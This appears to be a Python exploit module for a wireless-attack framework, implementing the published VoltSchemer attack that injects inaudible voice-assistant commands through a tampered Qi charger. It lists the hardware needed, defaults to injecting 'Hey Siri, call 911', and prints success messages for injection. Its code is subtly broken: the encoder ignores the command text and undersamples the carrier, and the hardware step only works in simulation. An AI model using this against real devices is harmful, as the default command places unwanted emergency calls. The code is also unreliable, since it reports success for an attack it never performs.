# Author: André Henrique (LinkedIn/X: @mrhenrike)
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """VoltSchemer: Voice Command Injection via Qi Charger Manipulation.

    VoltSchemer exploits the electromagnetic coupling between a Qi
    wireless charger and the target device.  By injecting carefully
    crafted voltage fluctuations into the charger's power supply,
    the attacker creates electromagnetic interference that couples
    into the device's microphone circuit, producing inaudible voice
    commands that are interpreted by Siri, Google Assistant, or
    other voice assistants.

    This is a contactless, inaudible attack that works through the
    charging pad without modifying the target device.

    Hardware requirements:
    - Qi wireless charger (any Qi-certified charger, modified)
    - Programmable power supply or signal generator: e.g.,
      Rigol DG1022Z or Siglent SDG1032X ($300-500)
    - RF amplifier: 20-50W at the Qi operating frequency
      (100-205 kHz), e.g., custom Class-D amplifier
    - Voltage injection circuit (capacitor-coupled to charger
      power rails)
    - Optional: oscilloscope for signal monitoring

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "VoltSchemer: Voice Command Injection via Qi Charger",
        "description": (
            "Injects inaudible voice commands into devices on a Qi "
            "wireless charger by manipulating the charger's supply "
            "voltage.  Electromagnetic interference couples into the "
            "device microphone, triggering Siri/Google Assistant.  "
            "Requires modified Qi charger, programmable signal "
            "generator (Rigol DG1022Z or similar), and RF amplifier "
            "(20-50W at 100-205 kHz).  Contactless and inaudible."
        ),
        "authors": (
            "Zihao Zhan et al. (University of Florida, VoltSchemer)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://www.usenix.org/conference/usenixsecurity24/presentation/zhan",
            "https://voltschemer.com/",
        ),
        "disclosure_date": "2024-02-01",
        "platform": "linux",
        "arch": "all",
        "privileged": False,
        "targets": (
            "iPhones with Siri on Qi charger",
            "Android devices with Google Assistant on Qi charger",
            "Any voice-assistant-enabled device on wireless charger",
        ),
    }

    target = OptIP("", "Target device description or voice assistant type")
    port = OptPort(1, "Not used (electromagnetic attack)")
    timeout = OptFloat(10.0, "Injection duration per command")
    siggen_device = OptString("simulate", "Signal generator device (VISA address or 'simulate')")
    voice_command = OptString("Hey Siri, call 911", "Voice command to inject")
    carrier_freq = OptFloat(150.0, "Qi carrier frequency in kHz")
    modulation_depth = OptFloat(0.3, "AM modulation depth (0.1-0.9)")
    voice_freq = OptFloat(3000.0, "Voice encoding frequency in Hz")
    amplifier_gain = OptFloat(30.0, "RF amplifier gain in dB")
    repeat_count = OptInteger(5, "Number of command injection attempts")

    _QI_FREQ_MIN_KHZ = 100.0
    _QI_FREQ_MAX_KHZ = 205.0

    def _validate_params(self) -> bool:
        freq = float(self.carrier_freq)
        depth = float(self.modulation_depth)
        return (
            self._QI_FREQ_MIN_KHZ <= freq <= self._QI_FREQ_MAX_KHZ
            and 0.1 <= depth <= 0.9
        )

    def _encode_voice_command(self, text: str) -> bytes:
        """Encode voice command as AM-modulated waveform samples.

        The voice command is encoded as amplitude modulation on the
        Qi carrier frequency, which couples into the device mic.
        """
        samples_per_sec = 48000
        duration = len(text) * 0.15
        num_samples = int(samples_per_sec * duration)

        carrier_hz = float(self.carrier_freq) * 1000
        mod_depth = float(self.modulation_depth)
        voice_hz = float(self.voice_freq)

        waveform = bytearray()
        import math
        for i in range(num_samples):
            t = i / samples_per_sec
            carrier = math.sin(2 * math.pi * carrier_hz * t)
            voice_env = (1 + mod_depth * math.sin(2 * math.pi * voice_hz * t))
            sample = int((carrier * voice_env * 0.5 + 0.5) * 255)
            waveform.append(max(0, min(255, sample)))
        return bytes(waveform)

    def _send_to_siggen(self, waveform: bytes) -> bool:
        """Send waveform to signal generator."""
        if str(self.siggen_device) == "simulate":
            return True
        return False

    @mute
    def check(self) -> bool:
        """Verify signal generator accessibility."""
        if str(self.siggen_device) == "simulate":
            return True
        return False

    def run(self) -> None:
        if not self._validate_params():
            print_error(
                f"Invalid parameters: carrier {self.carrier_freq} kHz "
                f"(range: {self._QI_FREQ_MIN_KHZ}-{self._QI_FREQ_MAX_KHZ}), "
                f"modulation depth {self.modulation_depth} (range: 0.1-0.9)"
            )
            return

        print_success(
            f"VoltSchemer voice injection: '{self.voice_command}' "
            f"at {self.carrier_freq} kHz, depth {self.modulation_depth}"
        )
        self._exploit()

    def _exploit(self) -> None:
        print_status(f"Encoding voice command: '{self.voice_command}'")
        waveform = self._encode_voice_command(str(self.voice_command))
        print_info(f"Waveform: {len(waveform)} samples")

        for i in range(int(self.repeat_count)):
            print_status(f"Injecting command attempt {i + 1}/{self.repeat_count}")
            if not self._send_to_siggen(waveform):
                print_error("Signal generator communication failed")
                return
            time.sleep(float(self.timeout) / int(self.repeat_count))

        print_success(
            f"Voice command injected {self.repeat_count} times. "
            "If the target device is on the Qi charger with voice "
            "assistant enabled, the command should be processed. "
            "Monitor the target for voice assistant activation."
        )
